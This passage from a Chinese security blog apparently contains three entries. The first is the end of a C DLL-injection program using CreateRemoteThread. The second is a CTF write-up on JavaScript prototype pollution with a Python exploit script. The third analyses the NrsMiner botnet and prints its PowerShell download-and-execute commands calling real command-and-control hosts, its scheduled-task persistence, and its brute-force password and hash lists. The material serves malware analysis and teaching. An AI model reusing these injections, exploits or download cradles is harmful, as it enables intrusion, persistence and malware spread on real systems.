printf(&quot;VirtualAllocEx Sucess 0x%x\n&quot;, vaeAddr);        if (false == WriteProcessMemory(pidmodule, vaeAddr, dllname, dllnamesize, NULL)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        FARPROC loadaddress = GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),  &quot;LoadLibraryA&quot;);        if (loadaddress == NULL) {               printf(&quot;Get Kernel32 Address Error Code:%d\n&quot;, GetLastError());               return 1;        }        printf(&quot;Get Function LoadlibraryA Function Address:0x%x\n&quot;, loadaddress);        HANDLE runthread = CreateRemoteThread(pidmodule, NULL, 0,  (LPTHREAD_START_ROUTINE)loadaddress, vaeAddr, 0, NULL);        if (runthread == NULL) {               printf(&quot;CreateRemoteThread Error Code:%d\n&quot;, GetLastError());        }        printf(&quot;CreateRemoteThread Sucess\n&quot;);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/03/15/6BMHaD.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_41890599/article/details/108771480" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41890599/article/details/108771480</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>js源链污染</title>
      <link href="/posts/3e45dbe4.html"/>
      <url>/posts/3e45dbe4.html</url>
      <content type="html"><![CDATA[<p>题目考的目的:js原链污染</p><h2 id="js原链污染简介"><a href="#js原链污染简介" class="headerlink" title="js原链污染简介"></a>js原链污染简介</h2><blockquote><p>JavaScript是一门灵活的语言，基于原型实现继承，原型是Javascript的继承的基础。<br>它本身不提供一个 class实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的<br>遵循ECMAScript标准，someObject.[[Prototype]] 符号是用于指向 someObject 的原型。从 ECMAScript 6 开始，[[Prototype]] 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <strong>proto</strong></p></blockquote><p>每个实例对象都有一个私有属性<strong>proto</strong>指向它的构造函数的原型prototype，也就是</p><pre><code class="javascript">function a(){    this.a=&quot;AAA&quot;}b=new a()b.__proto__===a.Prototype</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jvp9S.png" alt=""><br>原型prototype是类的一个属性，而这个<strong>属性中的值和方法被每一个由类实例出来的对象所共有</strong>，而我们可以通过实例对象<code>test1.__proto__</code>来访问Test类的原型，那么这样就出现了一个问题，<strong>假如我们可以控制实例对象的<code>__proto__</code>属性，则等于可以修改该类所有实例对象的<code>__proto__</code>属性。</strong><br><img src="https://s3.ax1x.com/2021/03/10/6JvL2F.png" alt="网上的图"></p><h2 id="js原链污染测试"><a href="#js原链污染测试" class="headerlink" title="js原链污染测试"></a>js原链污染测试</h2><p>定义一个对象测试</p><pre><code class="javascript">challenger={&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;age&quot;:80}key={}challenger.__proto__.pwd2=&quot;pwd&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6JvVA0.png" alt=""></p><p>由于源链被污染，定义的pwd2值在任何地方都可以被访问到<br><img src="https://s3.ax1x.com/2021/03/10/6JvA7q.png" alt=""></p><p>更直接的表明<br><img src="https://s3.ax1x.com/2021/03/10/6Jvlu9.png" alt=""></p><p>非对象污染则会失败<br><img src="https://s3.ax1x.com/2021/03/10/6Jv3H1.png" alt=""></p><p>but，实际上的源链污染需要找到对应能操控对象的函数来进行污染</p><h2 id="bugkuctf-sodirty题目分析"><a href="#bugkuctf-sodirty题目分析" class="headerlink" title="bugkuctf sodirty题目分析"></a>bugkuctf sodirty题目分析</h2><p>源码如下:</p><pre><code class="javascript">var express = require(&#39;express&#39;);const setFn = require(&#39;set-value&#39;);var router = express.Router();const Admin = {    &quot;password&quot;:process.env.password?process.env.password:&quot;password&quot;}router.post(&quot;/getflag&quot;, function (req, res, next) {    if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }});router.get(&#39;/reg&#39;, function (req, res, next) {    req.session.challenger = {        &quot;username&quot;: &quot;user&quot;,        &quot;password&quot;: &quot;pass&quot;,        &quot;age&quot;: 80    }    res.send(&quot;用户创建成功!&quot;);});router.get(&#39;/&#39;, function (req, res, next) {    res.redirect(&#39;index&#39;);});router.get(&#39;/index&#39;, function (req, res, next) {    res.send(&#39;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#39;);});router.post(&quot;/update&quot;, function (req, res, next) {    if(req.session.challenger === undefined){        res.redirect(&#39;/reg&#39;);    }else{        if (req.body.attrkey === undefined || req.body.attrval === undefined) {            res.send(&quot;传参有误&quot;);        }else {            let key = req.body.attrkey.toString();            let value = req.body.attrval.toString();            setFn(req.session.challenger, key, value);            res.send(&quot;修改成功&quot;);        }    }});module.exports = router;</code></pre><p>分析流程:</p><pre><code class="text">/路径：1.重定向到/reg路径/reg路径:创建一个req.session.challenger对象/update路径:1.req.session.challenger如果为空则被重定向到/reg路径    2.req.body.attrkey或req.body.attrval为undefined的情况下返回为&quot;传参有误&quot;    2.如果不为undefined将设置key和value，调用setFn函数设置req.session.challenger对象的值传参链:req.body.attrkey/req.body.attrval-&gt;let key = req.body.attrkey.toString();/let value = req.body.attrval.toString()；-&gt;setFn(req.session.challenger, key, value); #原链污染点/getflag路径:1.req.body.password为undefined或req.body.password等于req.session.challenger对象里的password则返回登录失败2.req.session.challenger.age值大于79返回糟老头子坏滴很3.Admin对象里的key键的值等于req.body.password则返回真的flag</code></pre><p>漏洞点出现在</p><pre><code class="javascript">setFn(req.session.challenger, key, value);</code></pre><p>setFn函数对应<code>require(&#39;set-value&#39;);</code>,位于同目录下的<code>set-value/index.js</code>里的result函数</p><pre><code class="javascript">function result(target, path, value, merge) {  if (merge &amp;&amp; isPlain(target[path]) &amp;&amp; isPlain(value)) {    target[path] = merge({}, target[path], value);  } else {    target[path] = value;  }}</code></pre><p>对应的Github:<a href="https://github.com/freewisdom/set-value" target="_blank" rel="noopener">https://github.com/freewisdom/set-value</a><br><img src="https://s3.ax1x.com/2021/03/10/6JvsEt.png" alt=""></p><p>由于需要以<code>{&quot;key&quot;:&quot;value&quot;}</code>的方式来进行更新，所以要用json，具体是看文章知道</p><p>考点如下</p><pre><code>1.发现路由&quot;/reg&quot;会创建一个challenger用户字典2.发现路由&quot;/update&quot;可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改3.路由&quot;/getflag&quot;可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password是多少我们是不知道的</code></pre><p>题目解题思路如下</p><pre><code>1.操控源链创建一个变量2.更新req.session.challenger对象里age键值</code></pre><p>最后请求/getflag路径的时候，设置key参数为新建变量的名称和设置password变量名为新建变量名的值,使判断成立</p><pre><code class="javascript">if (req.body.password === undefined || req.body.password === req.session.challenger.password){        res.send(&quot;登录失败&quot;);    }else{        if(req.session.challenger.age &gt; 79){            res.send(&quot;糟老头子坏滴很&quot;);        }        let key = req.body.key.toString();        let password = req.body.password.toString();        if(Admin[key] === password){            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);        }else {            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);        }    }</code></pre><p>payload如下</p><pre><code class="python">import requestsclass getflag(object):    def __init__(self,url):        self.requests=requests.session()        self.headers={&quot;Content-Type&quot;: &quot;application/json&quot;}        self.reg=&quot;{}/reg&quot;.format(url)        self.update=&quot;{}/update&quot;.format(url)        self.getflag=&quot;{}/getflag&quot;.format(url)    def getflag_(self):        reg=self.requests.get(self.reg)        print(reg.text)        update=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;__proto__.pwd22&quot;,&quot;attrval&quot;:&quot;pwd&quot;})        print(update.text)        update2=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;age&quot;,&quot;attrval&quot;:10})        print(update2.text)        flag=self.requests.post(self.getflag,headers=self.headers,json={&quot;key&quot;:&quot;pwd22&quot;,&quot;password&quot;:&quot;pwd&quot;})        print(flag.text)if __name__ == &#39;__main__&#39;:    obj=getflag(&quot;http://114.67.246.176:19392&quot;)    obj.getflag_()</code></pre><p><img src="https://s3.ax1x.com/2021/03/10/6Jv28S.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a><br><a href="https://www.cnblogs.com/escape-w/p/12347705.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/12347705.html</a><br><a href="https://www.wlhhlc.top/posts/49040/" target="_blank" rel="noopener">https://www.wlhhlc.top/posts/49040/</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>NrsMiner挖矿僵尸网络分析</title>
      <link href="/posts/855d1ef5.html"/>
      <url>/posts/855d1ef5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下午在群里看见一<code>app.any.run</code>的链接，没啥事情做分析了一下。做个记录</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本名称:shady.ps1<br>sha256:1a3960eaf2021049e1eaed4c76029420a62c881f65533b3741be2050328a2ac4<br>sha1:6b294f6ad208cb7d23172cafbccf3db3d78b2c62<br>md5:5474aa765ddd0c1dff33e5bbe4aba272    </p><p><code>shady.ps1</code>打开一看 ，混淆过的<br><img src="https://s3.ax1x.com/2021/03/06/6uhpx1.png" alt=""></p><p>定位到函数结尾，发现IEX<br><img src="https://s3.ax1x.com/2021/03/06/6u4YTO.png" alt=""></p><p>写到新的ps1，整体如下<br><img src="https://s3.ax1x.com/2021/03/06/6u4snP.png" alt=""></p><p>函数列表</p><pre><code>function make_smb1_anonymous_login_packet function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_smb1_login8_packet8 function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function localscan function geth function LoadApifunction sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-BootKeyfunction Get-HBootKeyfunction Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function Get-UserKeysfunction DumpHashesfunction Invoke-MypassFunction LGDJSRFunction Get-WiSDGKDantsFunction Get-l64ftionFunction bud-ksgLHDnwnFunction Add-SignedIntAsUnsignedFunction Compare-Val1GreaterThanVal2AsUIntFunction Convert-UIntToIntFunction Test-MemoryRangeValidFunction Write-BytesToMemoryFunction Get-DelegateTypeFunction klsdjlkhfDjswpdyFunction Enable-SeDebugPrivilegeFunction sadkjhdsjDFunction Get-ImageNtHeadersFunction DHWE-kidDFunction KDHSD-JUWFFunction HDSK-OUHFFunction KJSHDeUFHEF7Function Cthis-SectioDSnsFunction LSHDjh3-updFunction lhsdu-jsdFunction SDhk34JSDFunction usdKdhdfFunction KSHDUWKHFFunction SDHlhuhWEDSDDSFunction GessKUDBSDFunction LHSDGUKsdHFFunction SDLHLESDMEFunction MainFunction Mainfunction Invoke-SEfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMBTreeConnectAndXRequestfunction New-PacketSMBNTCreateAndXRequestfunction New-PacketSMBReadAndXRequestfunction New-PacketSMBWriteAndXRequestfunction New-PacketSMBCloseRequestfunction New-PacketSMBTreeDisconnectRequestfunction New-PacketSMBLogoffAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestFilefunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction New-PacketRPCBindfunction New-PacketRPCRequestfunction New-PacketSCMOpenSCManagerWfunction New-PacketSCMCreateServiceWfunction New-PacketSCMStartServiceWfunction New-PacketSCMDeleteServiceWfunction New-PacketSCMCloseServiceHandlefunction Get-StatusPendingfunction Get-UInt16DataLengthfunction Invoke-SMBCfunction ConvertFrom-PacketOrderedDictionaryfunction New-PacketNetBIOSSessionServicefunction New-PacketSMBHeaderfunction New-PacketSMBNegotiateProtocolRequestfunction New-PacketSMBSessionSetupAndXRequestfunction New-PacketSMB2Headerfunction New-PacketSMB2NegotiateProtocolRequestfunction New-PacketSMB2SessionSetupRequestfunction New-PacketSMB2TreeConnectRequestfunction New-PacketSMB2CreateRequestfunction New-PacketSMB2FindRequestFilefunction New-PacketSMB2QueryInfoRequestfunction New-PacketSMB2ReadRequestfunction New-PacketSMB2WriteRequestfunction New-PacketSMB2CloseRequestfunction New-PacketSMB2TreeDisconnectRequestfunction New-PacketSMB2SessionLogoffRequestfunction New-PacketSMB2IoctlRequest()function New-PacketSMB2SetInfoRequestfunction New-PacketNTLMSSPNegotiatefunction New-PacketNTLMSSPAuthfunction Get-UInt16DataLengthfunction copyrun function smb1_anonymous_login($sock)function negotiate_proto_request()function smb_header($smbheader) function smb1_get_response($sock)function client_negotiate($sock)function tree_connect_andx($sock, $target, $userid)function tree_connect_andx_request($target, $userid) function smb1_anonymous_connect_ipc($target)function make_smb1_nt_trans_packet($tree_id, $user_id) function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged($target, $size) function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)function make_smb2_payload_headers_packet()function eb7($target ,$shellcode) function createFakeSrvNetBuffer8($sc_size)function createFeaList8($sc_size, $ntfea)function  make_ntlm_auth_packet8($user_id) function smb1_login8($sock)function negotiate_proto_request8($use_ntlm)function smb_header8($smbheader) function smb1_get_response8($sock)function client_negotiate8($sock , $use_ntlm)function tree_connect_andx8($sock, $target, $userid)function tree_connect_andx8_request($target, $userid)  function make_smb1_nt_trans_packet8($tree_id, $user_id)  function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)function createSessionAllocNonPaged8($target, $size) function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  function make_smb2_payload_headers_packet8($for_nx)function eb8($target,$sc)   function sid_to_key($sid)function str_to_key($s)function NewRC4([byte[]]$key)function des_encrypt([byte[]]$data, [byte[]]$key)function des_decrypt([byte[]]$data, [byte[]]$key)function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)function Get-RegKeyClass([string]$key, [string]$subkey)function Get-UserName([byte[]]$V)function Get-UserHashes($u, [byte[]]$hbootkey)function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)function New-PacketSMB2IoctlRequest()</code></pre><p><strong>执行过程</strong></p><pre><code>-5获取所有用户名添加到用户列表    匹配普通用户SID的正则:        添加到$alluser列表-4检查当前用户是不是管理员    获取本机hash:        用户标志位(变量名:$un)        用户hash(变量名:$hs)        匹配出是管理员的hash            添加到用户列表(变量名:alluser)            添加到hash列表(变量名:$allhash)-3获取明文密码和NTLM HASH    匹配出用户名(变量名:$mm)    匹配出明文密码(变量名:$pp)    匹配出NTLM HASH(变量名:$nn)    匹配出域名(变量名:$dd)    用户名不为空:        添加到$getusers列表        添加到$alluser列表    明文密码不为空:        添加到$getpasswd列表        添加到$allpass列表    函数不为空(31d6cfe0d16ae931b73c59d7e0c089c0为空hash):        添加到$gethashs列表        添加到$allhash列表    域名不为空、不为workgroup组、不为本地计算机名:        添加到$getdomain组</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIpxs.png" alt=""></p><p>之后循环执行以下内容</p><pre><code>while(true)循环执行:    1.线程休眠200秒    2.创建名为Global\PSexec的互斥锁    3.获取第一张网卡的MAC地址    4.获取杀毒软件    5.如果存在杀毒 (条件判断)        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|        False:$av变量为空    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容    8.调用localscan函数检查本地和内网445端口判断是否开启    9.调用localscan函数检查本地和内网65353端口判断是否开启    10.$Bserver数组不存在该IP调用copyrun函数        调用Invoke-SMBC函数hash传递攻击        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)                    netsh.exe firewall add portopening tcp 65353 DNS&amp;netsh interface portproxy add v4tov4 listenport=65353 connectaddress=1.1.1.1 connectport=53                    schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn Sync /tr &quot;powershell -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA=&quot; /F #解码base64:IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/p?smb&#39;)                    schtasks /run /tn Sync&#39;                    上传文件到:                        C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try{(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True){try{IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/low?ipc&#39;)}catch{Sleep -m 2500000}}&quot;,0,false);}catch(e){}                        C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;        传递失败:    11.MS17010扫描攻击    12.休眠100秒</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIMs1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/03/06/6uIWyn.png" alt=""></p><p>提取出来的快捷方式<br><img src="https://s3.ax1x.com/2021/03/06/6uoZ0P.png" alt=""></p><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表:</p><pre><code>administratoradmin</code></pre><p>hash表</p><pre><code>32ed87bdb5fdc5e9cba88547376818d48846f7eaee8fb117ad06bdd830b7586c259745cb123a52aa2e693aaacca2db522d20d252a479f485cdf5e171d93985bfc22b315c040ae6e0efee3518d830362b7a21990fcd3d759941e45c490f143d5f7ce21f17c0aee7fb9ceba532d0546ad62d7f1a5a61d3a96fb5159b5eef17adc6328727b81ca05805a68ef26acb252039f7eb9c06fafaa23c4bcf22ba6781c1e2579110c49145015c47ecd267657d3174320a78179516c385e35a93ffa0b1c4acf9e37e83b83c47a93c2f09f66408631b31fc0dc8f7dfad0e8bd7ccc3842f2ce9f2477a144dff4f216ab81f2ac3e3207dbecedb42ec3c5c7f965255338be4453cccd3d95ea08b81140eee3cfbb98c68f18d4ef8654a9adc66d4f628e94f66e31b6d3986e540a63647454a50e26477ef94e8cd0e4a9e89eab931dc5338fcbec54a0d757ad173d2fc249ce19364fd64c8ecaf27efb60c7b238910efe2a7e0676a3974ed32086b1317b742c3a92148df10198af326aa4850225b75c592d4ce19ccf5bb53a477af18526ada697ce2e51f76b34057b60b514c5402dde3d29a1845c36627cd214350e6172ce708ee05f9d6d70a72f5cfa80f07819ccbcfb72feb9eb9b7f67f5e3f66efd7298be6acd32eeeb27c1d7774d5bbec877ba1bbfcac2f1ae2961c4ecc8938fb93812779077127e976626920c58d0df184d829189c44fafb7ece3fa45a060bd2693ae4c05b601d05ca0c152efbcfafeb22eabda8fc5e68697a41ad70819c5bc807280974d80f45982011c4e9cf8a64cfa6893e2fb666cd566d48f40460fe1ceec6f6785997f3319553bb1b46daf193bb579bdb3b8c6f09637eccee9423d5425f22baf082877edf0a5223820b13c5212be1f85048d7cc8f70bfa508381a7cb6f73d13260089df6015b7b469cbe3acbc48a3a289e8cdb000c2b7a820b2a7351c899fd8e230caad9dd9b994bcd285980e1d9b302e16875844ef697759dea36d05aacaa547de42e9956678e7162e829be112225fedf856e38e1c65fe9f8cc8c6e9e8ba3344ce00078175a4fff9e37e83b83c47a93c2f09f66408631bfaf94587adbfb93df82380f7ca2be801711417f28b0f8d2c5c1cde9554cf8f88acf586e39c5838baeea66ec864d7c437114a90eadeb78697e8f5d14888324caf3837b6534834cc2a88c58bf90b2d96f448d28627b7f196284b73f3c6fae4eded8a72db9f0eea602e3770c45cd3ed9bcdbdc2ef9d128643a227639d2f142d1434ba48d0d7833d929ba60030ae19a63875b20b89488f6f2decabf80294727a04306e2ba7aaa0297ecba56e3d90393bc147324e773ec800dc70882568f5a41d2b6362b26c13b70e7d5a9724710a41e63688f5c864e939801f4f239ff455c33730f821da95b451c2736231eedb87d08f7edbcd73b0aeeb2d1c1907c8783a05e8dd08c0d1ba5fcad640041f86f8060b384915b6d9897df4bb61b416fa405159418033aaf9f89a2d4d0cef5f8912461132b30ffac5d668099409cb6fa223a32ea493b62386e5c805ab8dff955fdb893df85f47f96ab5f0c4b478ee16d9520e4eb4318417dc1cd2340de61ee329d2bb291acb56ed356698adc4fcffe90c3e6d250fcf167b592e4f8178b4c75788531b2e74768747bf8039a8506cd67c524a03ff84ba4e5ae7b89b3afea28d448ed31b5c70428973f5d97549f033374fa6d9f9ce247ffde5ae562ddfaa6b446c32764ab1ebf3ed161cff084477fe596a5db81874498a24a87f3a337d73085c45f9416be5787d8600affd88fa323b00d4560bf9fef0ec2f69943c5e63b4d2c104dbbcc15138b72b588feb889288fb953b5f094d47d1565c3dbde697d71690a769204beb12283678df54de3f3438343202c1dd523d0265bef1351ac828428d74f6da2968089fc91fb3ec3e03e2a202cbd54fd104b8504fefa80c9cc3f8439ada25af064a874efe2d13b29964cc2480b4ef454c59562e675cde26cce0356891a4a020e7c4957afc72e19ccf75ee54e06b06a5907af13cef4230fcaa8ad9a496b3e17f7fbfacc7299341630abb825ca50da31ce1fac1e9f54df56a8399599f1be040128b1dd9623c292e4dbf83aa056289935daea328977b20b9f917853e3dbf6e6831ecce607259305835048ce94ad0564e29a924a03510efa4141712f19e9dd5adf16919bb38a95c</code></pre><p>明文密码</p><pre><code>123456password12345678qwerty1234567891234512341111111234567dragon123123baseballabc123footballmonkeyletmein696969shadowmaster666666qwertyuiop123321mustang1234567890michael654321pussysuperman1qaz2wsx7777777fuckyou121212000000qazwsx123qwekillera123456a123456789woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789PASSWORDAa123456qwer12345123@abc123!@#qwe1qaz@WSXPassw0rd123qwe!@#112123321888888abcd1234p@sswordP@sswordp@ssw0rdP@ssw0rdP@SSWORDP@SSW0RDP@$$w0rdP@$$wordpassw0rdpassword1administrator</code></pre><p>其中计划任务里的url，下载的另外个ps1。其实就是一开始混淆过的ps1，用于权限维持(下载的update.png)<br>1.获取首个网卡MAC地址<br>2.互斥锁创建<br>3.检查C:\Windows\Temp\xxx.log是否存在，不存在则创建Winnet计划任务<br>4.休眠随机1-20秒<br>5.检查进程运行的命令是否带有downloadstring,没有远程下载执行</p><pre><code class="powershell">[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC) #首个网卡MAC地址try{        $name = &#39;Global\PSEXEC&#39;        $exeflag = $flase        New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag) #互斥锁创建}catch{}$dt = Get-Date -Format &#39;yyMMdd&#39; #日期格式化$path = &quot;$env:temp\\ccc.log&quot;[string]$flag = test-path $path #检查路径是否存在$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;) #判断当前用户是否位管理员$key = &quot;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;version=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + &quot;&amp;user=&quot; + $env:USERNAME + &quot;&amp;PS=&quot; + $exeflagif($flag -eq &#39;False&#39;){        New-Item $path -type file        if($permit){                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?hig&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39; #创建计划任务                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }else{                try{                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?low&quot; + $dt + &quot;&#39;)&quot;                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    $bcode = [Convert]::ToBase64String($Bytes)                    $scexec = &quot;/create /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39;                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;                }catch{}        }        &amp;schtasks /run /tn &quot;Winnet&quot; #创建另外个计划任务}else{}sleep (get-random -inputobject (1..20)) #休眠1-20秒try{        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern &quot;downloadstring&quot; #检查进程运行的命令是否带有downloadstring,没有远程下载执行        if(($run.length -lt 0) -and $exeflag){            $onps = &quot;/c powershell -nop -w hidden -ep bypass -c &quot; + &#39;&quot;&#39; + &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;&quot; + &quot;http://188.166.162.201/update.png?&amp;&quot; + 